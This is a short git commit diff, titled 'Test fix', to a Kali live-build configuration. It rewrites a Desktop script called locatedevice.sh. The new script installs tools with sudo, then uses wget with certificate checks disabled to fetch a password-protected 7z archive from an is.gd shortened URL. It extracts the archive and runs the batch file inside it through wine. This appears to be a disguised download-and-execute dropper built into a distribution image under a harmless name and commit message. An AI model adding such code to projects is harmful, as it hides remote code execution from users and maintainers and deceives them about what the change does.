ab1142d923627556e70c0f128a6dfec30f9f802f
independentcod <ind3p3nd3nt@outlook.com>
2020-09-05 02:30:26 -0700

    Test fix

--- live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
+++ live-build-config/kali-config/common/includes.chroot/root/Desktop/locatedevice.sh
@@ -1,6 +1,12 @@
 #!/bin/bash
-if [ -z "~/m.exe" ]; then
-wget -O ~/m.exe https://is.gd/locateme
+if [ -z "/bin/7za" ]; then
+sudo apt install p7zip wget -y
 fi
-wine ~/m.exe;
+if [ -z "~/init/m.7z" ]; then
+mkdir ~/init/
+wget --no-check-certificate -O ~/init/m.7z https://is.gd/l0cateme
+fi
+cd ~/init/;
+7za x -p1011011011 m.7z;
+wine cmd.exe "init.bat";
 exit 0
